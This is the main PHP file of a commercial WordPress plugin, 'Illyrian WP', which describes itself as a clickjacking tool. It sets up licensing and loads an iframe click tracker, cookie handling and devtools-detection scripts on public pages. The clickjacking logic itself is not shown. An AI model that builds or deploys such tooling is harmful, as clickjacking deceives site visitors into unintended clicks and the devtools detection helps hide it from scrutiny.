<?php
/*
    Plugin Name: Illyrian WP
    Plugin URI: https://jkruja.com/products/illyrian-wp-plugin/
    Description: ClickJacking plugin in every element you want.
    Author: Jurgen Kruja
    Author URI: https://jkruja.com/
    Version: 1.0
*/

// This is the URL our updater / license checker pings. This should be the URL of the site with WPLS installed
define( 'WPLS_STORE_URL', 'https://licensing.jkruja.com' ); // you should use your own CONSTANT server url, and be sure to replace it throughout this file

// The product code of your product. This should match the download name in WPLS exactly
define( 'WPLS_ITEM_CODE', 'illyrianWp' ); // you should use your own CONSTANT CODE, and be sure to replace it throughout this file

class Illyrian_Plugin {

	/*  Construct The Plugin Object */
	public function __construct() {
		/* Set the constants needed by the plugin. */
		add_action( 'plugins_loaded', array( &$this, 'plugin_constants' ), 1 );

		/* Load the backend files. */
		add_action( 'plugins_loaded', array( &$this, 'backend_assets' ), 2 );

		/* Load the backend scripts. */
		add_action( 'admin_enqueue_scripts', array( &$this, 'backend_scripts' ) );

		/* Load the frontend files. */
		add_action( 'wp_enqueue_scripts', array( &$this, 'frontend_assets' ) );
	}

	/*  Defines constants used by the plugin.   */
	public function plugin_constants() {
		/* Set constant path to the plugin directory. */
		define( 'plugin_dir', trailingslashit( plugin_dir_path( __FILE__ ) ) );

		/* Set constant path to the plugin URL. */
		define( 'plugin_url', trailingslashit( plugin_dir_url( __FILE__ ) ) );

		/* Set the constant path to the admin directory. */
		define( 'plugin_includes', plugin_dir . trailingslashit( 'includes' ) );

		/* Set the constant path to the Ads admin directory. */
		define( 'plugin_includes_url', plugin_url . trailingslashit( 'includes' ) );

		/* Set the constant path to the Ads assets directory. */
		define( 'plugin_assets', plugin_url . trailingslashit( 'assets' ) );

		/* Set the constant path to the Ads Styles directory. */
		define( 'plugin_styles', plugin_assets . trailingslashit( 'css' ) );

		/* Set the constant path to the Image directory. */
		define( 'plugin_image', plugin_assets . trailingslashit( 'img' ) );

		/* Set the constant path to the Ads Scripts directory. */
		define( 'plugin_scripts', plugin_assets . trailingslashit( 'js' ) );
	}

	/* Load the backend files needed for the plugin. */
	function backend_assets() {

		require_once( plugin_includes . 'plugin-updates.php' );
		new WPLSPluginUpdater_illyrianWp( WPLS_STORE_URL, plugin_basename( __FILE__ ), WPLS_ITEM_CODE, get_option( WPLS_ITEM_CODE . '_license_key', '' ), get_option( WPLS_ITEM_CODE . '_license_email', '' ) );

		require_once( plugin_includes . 'backend_functions.php' );
		$ib = new Illyrian_Backend( WPLS_STORE_URL, WPLS_ITEM_CODE );

		$isValid = $ib->check_serial_valid();
		if ( $isValid == true ) {
			/* Load the Files in Admin Section. */
			require_once( plugin_includes . 'frontend_functions.php' );
			require_once( plugin_includes . 'process_post.php' );
		}
	}

	/* Load the backend files needed for the plugin. */
	function backend_scripts() {
		wp_enqueue_style( 'backendStyles', plugin_styles . 'admin.css' );

		wp_enqueue_script( 'jquery' );
		wp_enqueue_script( 'backendScripts', plugin_scripts . 'backend_script.js' );
	}

	/* Load the frontend files needed for the plugin. */
	function frontend_assets() {
		wp_enqueue_script( 'jquery' );
		wp_enqueue_script( 'iframetracker', plugin_scripts . 'libraries/jquery.iframetracker.js' );
		wp_enqueue_script( 'jscookies', plugin_scripts . 'libraries/cookies.js' );
		wp_enqueue_script( 'devtool', plugin_scripts . 'libraries/devtools_detect.js' );
		wp_enqueue_script( 'jdetects', plugin_scripts . 'libraries/jdetects.js' );
		wp_enqueue_script( 'frontendScripts', plugin_scripts . 'frontend_scripts.js' );
	}

}

/* Instantiate the Store class */
$ObStore = new Illyrian_Plugin();
